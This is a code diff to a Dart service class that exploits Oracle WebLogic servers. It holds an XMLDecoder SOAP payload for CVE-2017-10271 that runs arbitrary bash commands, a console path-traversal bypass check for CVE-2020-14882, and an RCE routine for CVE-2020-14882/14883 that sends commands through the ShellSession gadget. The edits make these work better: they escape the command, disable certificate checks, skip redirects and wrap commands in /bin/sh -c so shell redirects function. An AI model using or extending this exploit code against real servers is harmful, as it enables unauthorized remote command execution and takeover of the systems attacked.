@@ -1,3 +1,5 @@
+import 'dart:io';
+
 import 'package:http/http.dart' as http;
 
 import 'exp_result.dart';
@@ -207,7 +209,9 @@ class WebLogicExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
-  String _xmlDecoderPayload(String cmd) => '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  String _xmlDecoderPayload(String cmd) {
+    final safe = RceEncoder.xmlEscape(cmd);
+    return '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java version="1.4.0" class="java.beans.XMLDecoder">
@@ -215,7 +219,7 @@ class WebLogicExpService {
   <array class="java.lang.String" length="3">
     <void index="0"><string>/bin/bash</string></void>
     <void index="1"><string>-c</string></void>
-    <void index="2"><string>$cmd</string></void>
+    <void index="2"><string>$safe</string></void>
   </array>
   <void method="start"/>
 </void>
@@ -224,6 +228,7 @@ class WebLogicExpService {
 </soapenv:Header>
 <soapenv:Body/>
 </soapenv:Envelope>''';
+  }
 
   Future<ExpResult> checkCve201710271() async {
     try {
@@ -261,33 +266,52 @@ class WebLogicExpService {
   }
 
   Future<ExpResult> checkCve202014882() async {
+    // Must NOT follow redirects: the bypass returns 302 → console.portal.
+    // If we follow, the redirect target may 404 and we'd miss the detection.
+    // A Location header containing 'console.portal' confirms the server decoded
+    // %252e%252e%252f → %2e%2e%2f and routed it as a path-traversal bypass.
+    final client = HttpClient()
+      ..badCertificateCallback = (_, __, _) => true;
     try {
-      final res = await http
-          .get(Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal'))
-          .timeout(timeout);
-      if (res.statusCode == 200 || res.statusCode == 302) {
+      final uri = Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal');
+      final req = await client.getUrl(uri).timeout(timeout);
+      req.followRedirects = false;
+      final res = await req.close().timeout(timeout);
+      final location = res.headers.value('location') ?? '';
+      if ((res.statusCode == 302 || res.statusCode == 200) &&
+          location.contains('console.portal')) {
         return ExpResult(
           true,
           'CVE-2020-14882/14883',
-          '控制台路径绕过成功 (${res.statusCode})',
+          '控制台路径绕过成功，Location: $location',
         );
       }
-    } catch (_) {}
+    } catch (_) {
+    } finally {
+      client.close();
+    }
     return const ExpResult(false, 'CVE-2020-14882/14883', '');
   }
 
   Future<String?> execRceCve202014882(String cmd) async {
+    // ShellSession uses getRuntime().exec(String[]) under the hood — shell
+    // redirects (>&, |, etc.) don't work unless wrapped with sh -c.
+    // Response body is always the console HTML page; command output goes to
+    // the server-side process only, so we never show the body.
     try {
-      final shellCmd = cmd
-          .replaceAll(r'\', r'\\')
-          .replaceAll("'", r"\'");
+      final safeCmd = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
+      final groovyCmd =
+          "java.lang.Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','$safeCmd'});";
       final handle = Uri.encodeQueryComponent(
-        'com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\'$shellCmd\');")',
+        'com.tangosol.coherence.mvel2.sh.ShellSession("$groovyCmd")',
       );
       final url =
           '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
       final res = await http.get(Uri.parse(url)).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
+      if (res.statusCode == 200 || res.statusCode == 302) {
+        return '命令已发送 (状态 ${res.statusCode})，ShellSession 无直接回显';
+      }
+      return null;
     } catch (_) {
       return null;
     }
